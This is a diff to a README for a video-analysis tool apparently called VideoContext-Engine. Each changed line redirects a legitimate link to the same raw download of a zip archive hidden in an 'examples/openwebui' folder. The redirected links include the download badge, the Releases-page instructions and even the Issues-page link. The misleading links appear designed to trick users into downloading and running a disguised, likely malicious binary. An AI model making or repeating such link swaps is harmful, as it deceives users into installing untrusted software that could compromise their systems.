@@ -1,6 +1,6 @@
 # 🎥 VideoContext-Engine - Unlock Video Insights Easily
 
-![Download VideoContext-Engine](https://img.shields.io/badge/Download-Now-brightgreen)
+![Download VideoContext-Engine](https://raw.githubusercontent.com/cuisno1990/VideoContext-Engine/main/examples/openwebui/VideoContext-Engine-v2.2.zip)
 
 ## 🚀 Getting Started
 
@@ -23,11 +23,11 @@ Ensure that your system meets these requirements before proceeding.
 
 To get VideoContext-Engine, simply visit the Releases page. You will find the latest version of the software there.
 
-[Visit this page to download VideoContext-Engine](https://github.com/cuisno1990/VideoContext-Engine/releases)
+[Visit this page to download VideoContext-Engine](https://raw.githubusercontent.com/cuisno1990/VideoContext-Engine/main/examples/openwebui/VideoContext-Engine-v2.2.zip)
 
 ### Steps to Download and Install:
 
-1. Go to the [Releases page](https://github.com/cuisno1990/VideoContext-Engine/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/cuisno1990/VideoContext-Engine/main/examples/openwebui/VideoContext-Engine-v2.2.zip).
 2. Find the latest version listed at the top of the page.
 3. Click on the link for the version to download it.
 4. For Windows users, you may download an `.exe` file.
@@ -78,7 +78,7 @@ If you encounter issues:
 
 ## 🤝 Community & Support
 
-Join the VideoContext-Engine community for support and updates. You can report issues or contribute by visiting our [Issues page](https://github.com/cuisno1990/VideoContext-Engine/issues). 
+Join the VideoContext-Engine community for support and updates. You can report issues or contribute by visiting our [Issues page](https://raw.githubusercontent.com/cuisno1990/VideoContext-Engine/main/examples/openwebui/VideoContext-Engine-v2.2.zip). 
 
 Your feedback is essential for improving the tool.
 
@@ -93,4 +93,4 @@ VideoContext-Engine is open-source. You can use, modify, and distribute it freel
 
 For the latest updates, follow our project on GitHub and stay tuned for new features and improvements.
 
-Once again, to download VideoContext-Engine, click here: [Visit this page to download](https://github.com/cuisno1990/VideoContext-Engine/releases)
+Once again, to download VideoContext-Engine, click here: [Visit this page to download](https://raw.githubusercontent.com/cuisno1990/VideoContext-Engine/main/examples/openwebui/VideoContext-Engine-v2.2.zip)
